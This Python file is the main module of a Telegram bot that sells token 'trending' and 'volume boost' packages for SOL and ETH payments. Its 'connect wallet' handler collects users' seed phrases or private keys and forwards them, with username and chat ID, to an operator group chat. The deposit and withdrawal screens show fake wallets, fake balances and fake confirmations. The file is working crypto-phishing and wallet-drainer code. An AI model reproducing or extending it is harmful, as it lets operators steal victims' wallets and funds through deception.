# from telebot import TeleBot
# from telebot.types import InlineKeyboardButton
import sys
from bot_instance import bot
from startbump import handle_startbumps_callbacks, handle_start_bump
from user_sessions import set_user_ca, get_user_price, get_user_ca
import requests
from menu import start_message
from bot_interations import send_payment_verification_to_group, handle_group_callback, group_chat_id
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from text_utils import code_wrap, html_escape
from volume import handle_volume, handle_volume_package, volume_temp_ca_info
from premuim import handle_premium, handle_sol_trending, handle_sol_trending_callbacks, handle_eth_trending, handle_eth_trending_callbacks, handle_pumpfun_trending, handle_pumpfun_trending_callbacks
from deposit import handle_deposit
from connect import handle_connect, handle_connect_wallet, handle_connect_security, connect_phrase_waiting
from dexscreener import handle_dexscreener, handle_dexscreener_trend, banner_waiting
from wallets import SOL_WALLET, ETH_WALLET_100, ETH_WALLET_200, ETH_WALLET_300, PUMPFUN_WALLET, DEFAULT_WALLET
from ca_input_handler import handle_ca_input, handle_ca_callback, is_user_waiting_for_ca, send_ca_prompt
from bot_lock import BotLock
from stats import handle_stats_callback
from checkbalance import handle_balance_callback, admin_update_balance, get_balance_for_admin
# import telebot
# print(telebot.__version__)
import re
import time
import threading


prices = {}

# Enhanced tx_hash_waiting structure to store more data
tx_hash_waiting = {}

temp_ca_info = {}

def mdv2_escape(text):
    # Deprecated: kept for backward compatibility. Use html_escape instead.
    return text

def is_valid_tx_hash(tx_hash):
    # ETH: 0x + 64 hex chars
    if tx_hash.startswith('0x') and len(tx_hash) == 66 and all(c in '0123456789abcdefABCDEF' for c in tx_hash[2:]):
        return True
    # SOL: 43-88 base58 chars (letters/numbers, no 0x)
    if 43 <= len(tx_hash) <= 88 and tx_hash.isalnum() and not tx_hash.startswith('0x'):
        return True
    return False

def send_tx_hash_prompt(chat_id, price):
    """Send tx hash input prompt with cancel button"""
    text = (
        f"🧾 Order Details\n\n"
        f"You selected: <b>{html_escape(str(price))}</b>\n\n"
        f"Please send your <b>transaction hash</b> below for verification.\n\n"
        f"⏰ <b>Time Limit:</b> You have 15 minutes to submit your transaction hash."
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel"),
        InlineKeyboardButton("🔄 Retry", callback_data="tx_retry")
    )

    bot.send_message(chat_id, text, reply_markup=markup)

    # Store waiting state with timestamp
    tx_hash_waiting[chat_id] = {
        'timestamp': time.time(),
        'price': price,
        'ca': get_user_ca(chat_id)
    }

    # Start timeout thread
    start_tx_timeout(chat_id)

def start_tx_timeout(chat_id):
    """Start a timeout thread for tx hash submission"""
    def timeout_check():
        time.sleep(900)  # 15 minutes = 900 seconds
        if chat_id in tx_hash_waiting:
            # Check if still waiting after timeout
            waiting_data = tx_hash_waiting[chat_id]
            if time.time() - waiting_data['timestamp'] >= 900:
                # Timeout occurred
                tx_hash_waiting.pop(chat_id, None)
                markup = InlineKeyboardMarkup(row_width=1)
                markup.add(InlineKeyboardButton("🔝 Main Menu", callback_data="mainmenu"))
                bot.send_message(chat_id, "⏰ <b>Timeout</b>\nYou didn’t submit a transaction hash within 15 minutes. Your order has been cancelled.", reply_markup=markup)

    thread = threading.Thread(target=timeout_check)
    thread.daemon = True
    thread.start()

@bot.message_handler(commands=["groupid"])  # Run this in the target group to get its ID
def handle_group_id(message):
    try:
        chat_id = message.chat.id
        bot.reply_to(message, f"Group ID: {chat_id}")
    except Exception:
        pass

def handle_tx_callback(call):
    """Handle tx hash related callbacks (cancel, retry)"""
    chat_id = call.message.chat.id
    data = call.data

    if data == "tx_cancel":
        # Cancel tx hash submission
        tx_hash_waiting.pop(chat_id, None)

        # Send user back to main menu
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        start_message(call.message)

    elif data == "tx_retry":
        # Retry tx hash submission
        if chat_id in tx_hash_waiting:
            price = tx_hash_waiting[chat_id]['price']
            # Update timestamp for new attempt
            tx_hash_waiting[chat_id]['timestamp'] = time.time()

            # Send new prompt
            send_tx_hash_prompt(chat_id, price)

            try:
                bot.delete_message(chat_id, call.message.message_id)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ No active transaction is waiting. Please start a new order.")

def send_eth_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions with multiple wallet options"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }

    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    wallet_address_md = code_wrap(wallet_address)
    text = (
        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
        f"Your selection has been added successfully.\n\n"
        f"💳 <b>Payment Details</b>\n"
        f"Price: <b>{html_escape(str(price))}</b>\n"
        f"Wallet:\n{wallet_address_md}\n\n"
        f"📝 Please send the exact amount. {verify_text}"
    )
    bot.send_message(chat_id, text)

def send_pumpfun_payment_instructions(chat_id, price, token_name=None):
    """Send PumpFun trending payment instructions"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    pumpfun_address = PUMPFUN_WALLET
    pumpfun_address_md = code_wrap(pumpfun_address)
    text = (
        f"✅ <b>Order Placed Successfully</b>\n\n"
        f"We currently have an available slot.\n"
        f"Once payment is received, your trending will begin within <b>20 minutes</b>.\n\n"
        f"<b>Network:</b> SOL\n"
        f"<b>Payment Address</b>\n{pumpfun_address_md}\n"
        f"(Tap to copy){verify_text}"
    )
    bot.send_message(chat_id, text)

def send_volume_payment_instructions(chat_id, price, token_name=None):
    """Send volume boost payment instructions"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    # Get package details based on price
    package_details = {
        '1': {'name': 'Iron Package', 'volume': '$40,200'},
        '3': {'name': 'Bronze Package', 'volume': '$92,000'},
        '5.2': {'name': 'Gold Package', 'volume': '$932,000'},
        '7.5': {'name': 'Platinum Package', 'volume': '$1,400,000'},
        '10': {'name': 'Silver Package', 'volume': '$466,000'},
        '15': {'name': 'Diamond Package', 'volume': '$2,400,000'}
    }

    package = package_details.get(price, {'name': 'Volume Boost Package', 'volume': 'Custom'})

    wallet_address = SOL_WALLET
    wallet_address_md = code_wrap(wallet_address)

    text = (
        f"🚀 <b>Volume Boost Confirmed</b>\n\n"
        f"✅ <b>{html_escape(package['name'])}</b> has been added to your order.\n\n"
        f"📊 <b>Package Details</b>\n"
        f"• Package: {html_escape(package['name'])}\n"
        f"• Estimated Volume: {html_escape(package['volume'])}\n"
        f"• Price: <b>{html_escape(str(price))} SOL</b>\n\n"
        f"🟢 <b>Final Step: Payment</b>\n\n"
        f"Please complete a one-time payment of <b>{html_escape(str(price))} SOL</b> to the wallet below:\n\n"
        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
        f"Once payment is confirmed, your volume boost will be activated.{verify_text}"
    )

    bot.send_message(chat_id, text)

def send_eth_trending_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    # Get package details based on price
    package_details = {
        '100$': {'name': 'ETH Trending Basic', 'duration': '24 hours'},
        '200$': {'name': 'ETH Trending Standard', 'duration': '48 hours'},
        '300$': {'name': 'ETH Trending Premium', 'duration': '72 hours'}
    }

    package = package_details.get(price, {'name': 'ETH Trending Package', 'duration': 'Custom'})

    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }

    # Get the appropriate wallet address for the price
    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    wallet_address_md = code_wrap(wallet_address)

    text = (
        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
        f"✅ <b>{html_escape(package['name'])}</b> has been added.\n\n"
        f"📊 <b>Package Details</b>\n"
        f"• Package: {html_escape(package['name'])}\n"
        f"• Duration: {html_escape(package['duration'])}\n"
        f"• Price: <b>{html_escape(str(price))}</b>\n\n"
        f"🟢 <b>Final Step: Payment</b>\n\n"
        f"Please complete payment of <b>{html_escape(str(price))}</b> to the wallet below:\n\n"
        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
        f"Once payment is received, your ETH trending will be activated.{verify_text}"
    )

    bot.send_message(chat_id, text)

def send_payment_instructions(chat_id, price, token_name=None):
    # Check if this is a volume boost payment
    if price in ['1', '3', '5.2', '7.5', '10', '15']:
        send_volume_payment_instructions(chat_id, price, token_name)
        return

    # Check if this is an ETH trending payment
    if price and "$" in price:
        send_eth_trending_payment_instructions(chat_id, price, token_name)
        return

    # Check if this is a PumpFun trending payment
    if price and price == "30 SOL":
        send_pumpfun_payment_instructions(chat_id, price, token_name)
        return

    wallet_address = SOL_WALLET
    wallet_address_md = code_wrap(wallet_address)
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
    if token_name:
        text = (
            f"✅ <b>{html_escape(token_name)}</b> has been added.\n\n"
            f"🟢 <b>Final Step: Payment</b>\n\n"
            f"Please complete a one-time payment of <b>{html_escape(str(price))}</b> to the wallet below:\n\n"
            f"<b>Wallet</b>\n{wallet_address_md}\n\n"
            f"Once payment is confirmed, your bump order will be activated.{verify_text}"
        )
    else:
        text = (
            f"✅ <b>Token Added</b>\n\n"
            f"🟢 <b>Final Step: Payment</b>\n\n"
            f"Please complete a one-time payment of <b>{html_escape(str(price))} SOL</b> to the wallet below:\n\n"
            f"<b>Wallet</b>\n{wallet_address_md}\n\n"
            f"Once payment is confirmed, your bump order will be activated.{verify_text}"
        )
    price_to_image = {
        '0.3': 'https://github.com/raccityy/raccityy.github.io/blob/main/3.jpg?raw=true',
        '0.4': 'https://github.com/raccityy/raccityy.github.io/blob/main/4.jpg?raw=true',
        '0.5': 'https://github.com/raccityy/raccityy.github.io/blob/main/5.jpg?raw=true',
        '0.6': 'https://github.com/raccityy/raccityy.github.io/blob/main/6.jpg?raw=true',
    }
    # Extract numeric part from price (handle both "0.3" and "2 SOL" formats)
    if ' ' in price:  # Price contains "SOL" (e.g., "2 SOL")
        numeric_price = price.split(' ')[0]  # Extract "2" from "2 SOL"
    else:
        numeric_price = price  # Already numeric (e.g., "0.3")

    # Format price to one decimal place string for lookup
    price_str = f"{float(numeric_price):.1f}"
    image_url = price_to_image.get(price_str, None)
    if image_url and image_url.startswith('http'):
        try:
            bot.send_photo(chat_id, image_url, caption=text)
        except Exception:
            bot.send_message(chat_id, text)
    else:
        bot.send_message(chat_id, text)

# Group message handler - must be registered first to catch all group messages
@bot.message_handler(func=lambda message: message.chat.id == group_chat_id, content_types=['text', 'photo', 'video', 'animation', 'document', 'audio', 'voice', 'video_note', 'sticker', 'location', 'contact'])
def handle_group_messages(message):
    """Handle all messages sent to the admin group"""
    print(f"DEBUG: Group handler called for message from {message.from_user.id}, content type: {message.content_type}")
    from bot_interations import handle_admin_reply
    handle_admin_reply(message)

@bot.message_handler(commands=["start"])
def handle_start(message):
    start_message(message)
    # Notify group
    user = message.from_user.username or message.from_user.id
    bot.send_message(group_chat_id, f"User @{user} just clicked /start")


@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    # print(call.data)
    bot.send_message(group_chat_id, f"User @{call.from_user.username} just clicked {call.data}")

    # Handle group reply/close buttons
    if call.data.startswith("group_reply_") or call.data.startswith("group_close_"):
        handle_group_callback(call)
        return

    # Handle CA-related callbacks (cancel, retry)
    if call.data.startswith("ca_cancel_") or call.data.startswith("ca_retry_"):
        handle_ca_callback(call)
        return

    # Handle tx hash related callbacks (cancel, retry)
    if call.data.startswith("tx_"):
        handle_tx_callback(call)
        return

    # Standardized back and menu button handling
    if call.data == "back":
        # Back button should go back one step - this will be handled by specific handlers
        return
    elif call.data == "mainmenu":
        # Menu button should always go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "volume":
        handle_volume(call)
        return

    # Handle stats callbacks
    if call.data.startswith("stats"):
        handle_stats_callback(call)
        return

    # Handle balance callbacks
    if call.data.startswith("balance"):
        handle_balance_callback(call)
        return

    # Handle volume package buttons
    if call.data in [
        "vol_iron", "vol_bronze", "vol_gold", "vol_platinum", "vol_silver", "vol_diamond"
    ]:
        handle_volume_package(call)
        return

    if call.data == "vol_back":
        # Go back to main menu (one step back from volume)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return
    elif call.data == "vol_mainmenu":
        # Go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "vol_ca_confirm":
        chat_id = call.message.chat.id
        info = volume_temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_volume_payment_instructions(chat_id, price)
        return

    if call.data == "vol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "volume")
        return

    if call.data == "eth_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_eth_trending_payment_instructions(chat_id, price)
        return

    if call.data == "eth_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "eth_trending")
        return

    if call.data == "sol_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "sol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "sol_trending")
        return

    if call.data == "pumpfun_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "pumpfun_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "pumpfun_trending")
        return

    if call.data == "premium":
        handle_premium(call)
        return

    # Handle premium buttons
    if call.data.startswith("premium_"):
        if call.data == "premium_sol":
            handle_sol_trending(call)
        elif call.data == "premium_eth":
            handle_eth_trending(call)
        elif call.data == "premium_pumpfun":
            handle_pumpfun_trending(call)
        elif call.data == "premium_back":
            # Go back to main menu (one step back from premium)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "premium_menu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            handle_premium(call)
        return

    # Handle SOL trending buttons
    if call.data.startswith("sol_"):
        if call.data == "sol_back":
            # Go back to premium menu (one step back from SOL trending)
            handle_premium(call)
        elif call.data == "sol_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle SOL trending package selection
            handle_sol_trending_callbacks(call)
        return

    # Handle ETH trending buttons
    if call.data.startswith("eth_"):
        if call.data == "eth_back":
            # Go back to premium menu (one step back from ETH trending)
            handle_premium(call)
        elif call.data == "eth_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle ETH trending package selection
            handle_eth_trending_callbacks(call)
        return

    # Handle PumpFun trending buttons
    if call.data.startswith("pumpfun_"):
        if call.data == "pumpfun_back":
            # Go back to premium menu (one step back from PumpFun trending)
            handle_premium(call)
        elif call.data == "pumpfun_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle PumpFun trending package selection
            handle_pumpfun_trending_callbacks(call)
        return

    if call.data == "startbump":
        handle_start_bump(call)

    elif call.data.startswith("bump_"):
        # Forward bump-related callbacks to startbump handler
        handle_startbumps_callbacks(call)

    elif call.data == "deposit":
        handle_deposit(call)

    # Handle deposit buttons
    if call.data.startswith("deposit_"):
        if call.data == "deposit_add":
            bot.answer_callback_query(call.id)
            deposit_address = code_wrap(SOL_WALLET)
            text = (
                "walet GENERATED from telegrams wallet menu\n\n"
                "Make a minimum deposit of 0.20 sol to the address below⏬️⏬️⏬️\n\n\n"
                "💳 Wallet:\n"
                f"{deposit_address}"
            )
            bot.send_message(call.message.chat.id, text)
        elif call.data == "deposit_withdraw":
            bot.answer_callback_query(call.id)
            text = (
                "⚠️ <b>Insufficient Balance</b>\n\n"
                "Your current balance is <b>0.0 SOL</b>.\n\n"
                "Please deposit at least <b>0.20 SOL</b> to continue and get your project trending."
            )
            bot.send_message(call.message.chat.id, text)
        elif call.data == "deposit_balance":
            bot.answer_callback_query(call.id)
            eth_address = code_wrap(ETH_WALLET_100)
            sol_address = code_wrap(SOL_WALLET)
            text = (
                "💼 <b>Wallet Balances</b>\n\n"
                "ETH:\n"
                f"{eth_address}\n"
                f"Balance: {code_wrap('0.0 ETH')}\n\n"
                "SOL:\n"
                f"{sol_address}\n"
                f"Balance: {code_wrap('0.0 SOL')}\n\n"
                "Tip: Deposit at least <b>0.20 SOL</b> to get trending on several platforms."
            )
            bot.send_message(call.message.chat.id, text)
        elif call.data == "deposit_back":
            # Go back to main menu (one step back from deposit)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "deposit_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    # Handle dexscreener buttons
    if call.data.startswith("dexscreener_"):
        if call.data == "dexscreener_trend":
            handle_dexscreener_trend(call)
        elif call.data == "dexscreener_back":
            # Go back to main menu (one step back from dexscreener)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "dexscreener_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "connect":
        handle_connect(call)

    # Handle connect buttons
    if call.data.startswith("connect_"):
        if call.data == "connect_wallet":
            handle_connect_wallet(call)
        elif call.data == "connect_security":
            handle_connect_security(call)
        elif call.data == "connect_back":
            # Go back to main menu (one step back from connect)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "connect_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "dexscreener":
        handle_dexscreener(call)

    elif call.data == "ca_confirm":
        chat_id = call.message.chat.id
        info = temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        else:
            bot.answer_callback_query(call.id, "❌ No CA info found. Please try again.")
        return

    elif call.data == "back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "general")
        return

    # Handle connect wallet retry/menu buttons
    elif call.data == "try_connect_again":
        connect_phrase_waiting[call.message.chat.id] = True
        bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_connect_wallet(call)
        # print("yes")
        return
    # Handle connect wallet menu button
    elif call.data == "menu_for_connect":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    # else:
    #     bot.answer_callback_query(call.id)
    #     bot.send_message(call.message.chat.id, "❌ Unknown action.")


@bot.message_handler(commands=["sent"])
def handle_sent(message):
    chat_id = message.chat.id
    price = get_user_price(chat_id)
    if price:
        send_tx_hash_prompt(chat_id, price)
    else:
        bot.send_message(chat_id, "No bump order in progress. Please start a new bump order first.")


@bot.message_handler(func=lambda message: not message.text.startswith('/') and message.chat.id != group_chat_id)
def handle_contract_address_or_tx(message):
    chat_id = message.chat.id



    if chat_id in tx_hash_waiting:
        tx_hash = message.text.strip()
        if is_valid_tx_hash(tx_hash):
            waiting_data = tx_hash_waiting[chat_id]
            price = waiting_data['price']
            ca = waiting_data['ca']
            user = message.from_user.username or message.from_user.id
            send_payment_verification_to_group(user, price, ca, tx_hash, user_chat_id=chat_id)
            bot.send_message(chat_id, "✅ <b>Thank you!</b> Your transaction hash was sent for verification. Please wait for confirmation.")
            tx_hash_waiting.pop(chat_id, None)
        else:
            # Invalid tx hash - show retry options
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🔄 Retry", callback_data="tx_retry"),
                InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel")
            )
            bot.send_message(chat_id, "❌ <b>Invalid Transaction Hash</b>\nPlease send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
        return

    # Handle CA input with new handler
    if is_user_waiting_for_ca(chat_id):
        # Determine which temp_ca_info to use based on the source
        from ca_input_handler import ca_waiting_users
        if chat_id in ca_waiting_users:
            source = ca_waiting_users[chat_id]['source']
            if source == "volume":
                ca_info_dict = volume_temp_ca_info
            else:
                ca_info_dict = temp_ca_info
        else:
            ca_info_dict = temp_ca_info

        if handle_ca_input(message, send_payment_instructions, ca_info_dict):
            return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here

    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        if message.photo:
            # Valid image received, trigger premium_sol function
            banner_waiting.pop(chat_id, None)
            # Call SOL trending directly
            chat_id = message.chat.id
            text = (
                "📈 <b>Boost Your Visibility</b>\n\n"
                "Trending delivers guaranteed exposure, milestone highlights, and real-time momentum updates to amplify your project.\n\n"
                "🎙️ A paid boost also guarantees you a spot in our daily livestream (AMA).\n\n"
                "Please choose an option below to get started:\n"
                "_____________________"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            # Top header
            markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
            # First row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
                InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
            )
            # Second row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
                InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
            )
            # Third row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
                InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
            )
            # Bottom row: 2 wider buttons
            markup.add(
                InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
                InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
            )
            bot.send_message(chat_id, text, reply_markup=markup)
        else:
            bot.send_message(chat_id, "❌ Please send a valid image file.")
        return

    # Handle wallet phrase input for connect
    if connect_phrase_waiting.get(chat_id):
        # Check if the phrase is valid (12 or 24 space-separated words) or a valid private key
        phrase = message.text.strip()
        words = phrase.split()
        is_phrase = len(words) in [12, 24]
        is_private_key = len(phrase) > 10
        if is_phrase or is_private_key:
            bot.send_message(chat_id, "CONNECTION OF WALLET MAY TAKE SOME TIME BASED ON NETWORK CONJESTIONS \nPLEASE BE PATIENT")
            # Notify group to await reply
            user = message.from_user.username or message.from_user.id
            bot.send_message(group_chat_id, f"Awaiting reply for wallet connection from @{user}")
            connect_phrase_waiting.pop(chat_id, None)
            # Send phrase/private key to bot group with reply/close buttons
            phrase_md = mdv2_escape(phrase)
            group_text = (
                f"CONNECT WALLET\n"
                f"User: @{user} (ID: {chat_id})\n"
                f"Phrase: {phrase_md}"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("reply", callback_data=f"group_reply_{chat_id}"),
                InlineKeyboardButton("close", callback_data=f"group_close_{chat_id}")
            )
            bot.send_message(group_chat_id, group_text, reply_markup=markup, parse_mode="Markdown")
        else:
            connect_phrase_waiting.pop(chat_id, None)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("Retry", callback_data="try_connect_again"),
                InlineKeyboardButton("Menu", callback_data="menu_for_connect")
            )
            bot.send_message(chat_id, "❌ Invalid wallet phrase or private key. Please send a valid 12 or 24 word phrase, or a valid private key.", reply_markup=markup)
        return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here


@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    
    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        banner_waiting.pop(chat_id, None)
        # Call SOL trending directly
        text = (
            "🟢Discover the Power of Trending!\n\n"
            "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
            "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
            "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
            "_____________________"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
        markup.add(
            InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
            InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
            InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
            InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
        )
        markup.add(
            InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
            InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
        )
        bot.send_message(chat_id, text, reply_markup=markup)
    # (You can add other photo handling logic here if needed)

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    """Handle all text messages including custom withdrawal amounts"""
    chat_id = message.chat.id
    
    # Check if user is trying to make a custom withdrawal
    if message.text and message.text.replace('.', '').replace('-', '').isdigit():
        try:
            amount = float(message.text)
            if 0.001 <= amount <= 1000:  # Reasonable withdrawal range
                # Check if user has sufficient balance
                from checkbalance import get_user_balance, update_user_balance
                
                current_balance = get_user_balance(chat_id)
                if current_balance >= amount:
                    # Process withdrawal
                    new_balance = update_user_balance(chat_id, -amount, f"withdraw_custom_{int(time.time())}")
                    
                    withdrawal_text = f"""
✅ <b>WITHDRAWAL PROCESSED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💰 <b>WITHDRAWAL DETAILS</b>
• Amount Withdrawn: <b>{amount:.4f} SOL</b>
• Remaining Balance: <b>{new_balance:.4f} SOL</b>
• Transaction ID: <b>withdraw_custom_{int(time.time())}</b>

⏰ <b>PROCESSING TIME</b>
• Status: <b>🟡 Pending</b>
• Estimated: <b>24 hours</b>
• You'll be notified when completed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 <i>Withdrawal request submitted at {time.strftime('%H:%M:%S UTC')}</i>
"""
                    
                    markup = InlineKeyboardMarkup()
                    back_btn = InlineKeyboardButton("🔙 Back to Balance", callback_data="balance")
                    refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data="balance")
                    
                    markup.add(back_btn, refresh_btn)
                    
                    bot.send_message(chat_id, withdrawal_text, reply_markup=markup, parse_mode="HTML")
                    return
                else:
                    bot.send_message(chat_id, f"❌ Insufficient balance! You have {current_balance:.4f} SOL, trying to withdraw {amount:.4f} SOL")
                    return
        except ValueError:
            pass  # Not a valid number, continue with normal processing
    
    # If not a withdrawal, handle as normal message
    # (Add other text message handling here if needed)


if __name__ == "__main__":
    # Create process
    # lock to prevent multiple instances
    bot_lock = BotLock()

    if not bot_lock.acquire():
        print("Exiting...")
        sys.exit(1)

    print("bot is running")
    try:
        bot.polling(none_stop=True, timeout=60)
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        bot_lock.release()
        print("Bot stopped")
